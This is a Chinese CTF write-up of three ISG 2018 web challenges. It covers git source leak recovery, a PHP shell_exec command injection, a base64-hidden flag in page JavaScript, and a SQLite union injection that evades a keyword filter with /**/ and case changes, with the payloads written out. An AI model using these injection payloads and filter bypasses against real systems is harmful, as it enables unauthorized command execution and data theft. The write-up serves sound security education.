## 作者：agetflag

## 原文来自：[ISG 2018 Web
Writeup](https://bbs.ichunqiu.com/thread-45213-1-1.html?from=beef)

## ISG 2018 Web Writeup

CTF萌新，所以写的比较基础，请大佬们勿喷，比赛本身的Web题也不难

## calc

首先看到题目后，在输入框中测试了一下，发现可以被执行

  
![image.png](https://image.3001.net/images/20180906/1536216418_5b90cd624056d.png!small)  

首先猜想是不是ssti，模板注入，但是平常遇到的模板注入题目中，python的居多，php的没怎么遇到过，有点怀疑如果是php的模板注入的话也不一定能搞得出来，这个时候扫一下目录

    
    
    python dirsearch.py -u http://202.120.7.205:60003/ -e php -t 60

发现存在git源码泄露

  
![image.png](https://image.3001.net/images/20180906/1536216425_5b90cd6916086.png!small)  

直接上githack看看能够拖下来什么东西

    
    
    python2 GitHack.py -u "http://202.120.7.205:60003/.git/"

  
![image.png](https://image.3001.net/images/20180906/1536216432_5b90cd701a5c0.png!small)  

将`index.php`下载了下载

开启代码审计模式

第22~27行对`GET`方法是否被使用做了一次判断

    
    
    <?php 
    $str="";
    if(!empty($_GET)){
        $str=$_GET["calc"];
    }
    ?>

第40~42行对变量`$str`是否为空做了一次判断

    
    
    <?php
    if($str !== ""){
    }
    ?>

接下来到第44~46行这里，看到使用了`shell_exec`函数，基本可以判断为命令注入了

    
    
    <?php
        echo $str." = ".shell_exec("echo \"$str\" | bc");
    ?>

接下来开始绕过

测试的话可以把`shell_exec`里面的内容粘贴到linux 的bash中进行测试

    
    
    echo \"$str\" | bc

可以看到`\"`转义字符输出`"`，

即

    
    
    echo "$str" | bc

`$str`函数是我们可以控制的值

开始绕过之旅

`|`在命令执行漏洞中经常用到，表示管道，上一条命令的输出，作为下一条命令参数

所以，会把echo 后的内容传值到`bc`命令，但是经过测试发现bc命令是不存在的，所以用linux 中的注释符`#`

注释掉它，基本构造如下

    
    
    echo "$str#" | bc

这样来说，可以注释掉后面的bc命令了，但是因为有`"`的阻碍，使我们没法达到目的，所以闭合掉双引号,再加上管道符

构造如下

    
    
    echo ""|$str#" | bc

  
![image.png](https://image.3001.net/images/20180906/1536216441_5b90cd79e3a40.png!small)  

将`$str`替换为`ls`命令，本地验证通过

构造payload，列一下题目的当前目录

    
    
    "| ls #

  
![image.png](https://image.3001.net/images/20180906/1536216448_5b90cd80355d8.png!small)  

发现flag文件`there_1s_4_fl4g`

构造payload读取

    
    
    "| cat there_1s_4_fl4g #

  
![image.png](https://image.3001.net/images/20180906/1536216455_5b90cd872f6e8.png!small)  

## secret

题目打开之后有弹窗

  
![image.png](https://image.3001.net/images/20180906/1536216460_5b90cd8cb714c.png!small)  

随便输入后，提示密码错误，右击查看源代码

发现第6~16行中包含了密码和要输出的内容

    
    
    <script type="text/javascript">
        a = prompt("Password");
        if(a=="H4CK3D")
        {
            alert("Flag is '"+atob("WW91IGFyZSBUcmFwcGVkIDopIFRoaXMgaXMgbm90IHRoZSBmbGFnLiBDaGVjayBhcm91bmQu")+"'");
        }
        else
        {
            alert("Wrong Password!");
        }
    </script>

其中`prompt`方法用于显示可提示用户进行输入的对话框

`atob`函数是javascript中用于解密base64编码的方法，直接解密字符串

    
    
    >>> import base64
    >>> base64.b64decode("WW91IGFyZSBUcmFwcGVkIDopIFRoaXMgaXMgbm90IHRoZSBmbGFnLiBDaGVjayBhcm91bmQu")
    b'You are Trapped :) This is not the flag. Check around.'

发现并没有flag

提示让我们去周围找一找

访问`index.html`页面，发现进行了302跳转到了`trap.html`页面

我们直接查看`index.html`页面的源码

  
![image.png](https://image.3001.net/images/20180906/1536216470_5b90cd9686f73.png!small)发现其6~8行进行了一次302跳转  

直接看下面的代码

在45~55行中发现类似的前一个页面的代码

    
    
    <script type="text/javascript">
        a = prompt("Password");
        if(a=="H4CK3D")
        {
            alert("Flag is "+atob("ZmxhZzpJU0d7SDNJSU9fMXNHX2pzX1RyNHB9"));
        }
        else
        {
            alert("Wrong Password!");
        }
    </script>
    

直接解密得到flag

    
    
    >>> import base64
    >>> base64.b64decode("ZmxhZzpJU0d7SDNJSU9fMXNHX2pzX1RyNHB9")
    b'flag:ISG{H3IIO_1sG_js_Tr4p}'

## news

这个题考察了`sqlite`的注入，进行了简单的危险函数判断

这里刚开始普及一些`sqllite`知识

### sqllite基础

sqllite数据库注入和mysql数据库注入很像，不同点在于，sqllite数据库没有`information_schema`数据库，而是采用`sqlite_master`表，来存储当前数据库中所有表的相关信息，比如表的名称、用于创建此表的sql语句、索引、索引所属的表、创建索引的sql语句等。它的字段有

    
    
    type,name,tbl_name,rootpage,sql

`type`为类型

1.查询表信息

如果要查询表的信息，则type字段为“table”，name字段为表的名称，返回结果中返回的sql字段，为创建此表的sql语句。

    
    
    select * from sqlite_master where type=’table’ and name=‘表名’; 

2.查询索引信息

如果要查询索引信息，则type字段为“index”，name字段为索引名称，返回结果中的tbl_name字段为该索引所属的表，sql字段为创建此索引的sql语句。

    
    
    select * from sqlite_master where type=’index’ and name=‘索引名’;

`sql`为创建数据表的语句，这个对我们非常有用

`name` 对于表来说，是当前表的名字，对于索引来说是当前索引的名称

`tbl_name`是该索引所属的表的名字

`rootpage` 根据字面意思理解，应该是这个对象在数据库文件中的第一个页面位置。类似链表的一个指针

### 手工注入

首先去看它的`codesafe`函数这里判断了什么内容

在代码的第47~51行

    
    
    def codesafe(n):
        if re.search("select", n) or re.search(" ", n) or re.search("where", n) or re.search("=", n) or re.search("'", n):
            return False
        else:
            return True

可以看到，当其中有`select`、空格、`where`、`=`、`'`时，返回`False`

会触发第73~74行这里进行截断返回

    
    
    if not codesafe(id):
                return 'Hacker?'

了解请了这些后，开始注入

首先，判断空格可以通过`/**/`，来进行绕过，判断`select`可以采用大小写来绕过

`where`和`=`可以不用

这里采用了伪静态的模式，后面拼接`.html`可能是`web.py`框架里面内置判断，不拼接`.html`会显示404页面

开始注入

判断字段数为2

    
    
    http://202.120.7.206:60019/news-1/**/order/**/by/**/2.html

判断显示位

    
    
    http://202.120.7.206:60019/news-4/**/union/**/Select/**/1,2.html

  
![image.png](https://image.3001.net/images/20180906/1536216496_5b90cdb024152.png!small)  

查看建表的`sql`语句，可以直接获取字段和表名

    
    
    http://202.120.7.206:60019/news-4/**/union/**/Select/**/sql,2/**/from/**/sqlite_master.html

  
![image.png](https://image.3001.net/images/20180906/1536216502_5b90cdb692845.png!small)  

直接查看flag

    
    
    http://202.120.7.206:60019/news-4/**/union/**/Select/**/flag,2/**/from/**/flag.html

  
![image.png](https://image.3001.net/images/20180906/1536216511_5b90cdbf5c2cc.png!small)  

###  

# 大家有任何问题可以提问，更多文章可到[i春秋论坛](https://bbs.ichunqiu.com/portal.php?from=beef)阅读哟~

